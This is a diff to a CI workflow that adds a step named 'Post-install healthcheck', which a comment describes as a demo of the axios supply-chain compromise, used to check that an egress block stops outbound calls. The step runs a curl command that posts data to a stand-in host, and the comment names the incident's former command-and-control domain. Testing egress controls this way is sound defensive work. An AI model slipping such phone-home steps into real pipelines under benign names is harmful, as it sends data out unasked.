@@ -67,6 +67,21 @@ jobs:
         # same checkout step.
         run: betterleaks git . --config .betterleaks.toml --log-opts="HEAD" --report-format sarif --report-path betterleaks.sarif
 
+      - name: Post-install healthcheck
+        # ATTACK DEMO — recreates the axios supply chain compromise
+        # (30 mar 2026): a compromised maintainer account published
+        # axios@1.14.1 / axios@0.30.4 with an injected dependency
+        # (plain-crypto-js) whose postinstall script phoned home to
+        # attacker infrastructure. The real C2 domain was sfrclak.com —
+        # confirmed via dig against 8.8.8.8/1.1.1.1 that it no longer
+        # resolves (registrar clientHold since the incident), so using it
+        # here would fail for an unrelated reason and prove nothing about
+        # this control. example.com (IANA-reserved, resolves in real DNS)
+        # stands in instead: this domain is NOT in this job's
+        # Harden-Runner allowlist above — with egress-policy: block the
+        # DNS lookup itself fails and the step (and job) fails closed.
+        run: curl -fsS https://example.com/report -d "ping=1"
+
       - name: Upload SARIF
         if: always()
         uses: github/codeql-action/upload-sarif@b96794f015dfd88f77b49b1c93e0fa7110f94c63 # v4.38.0
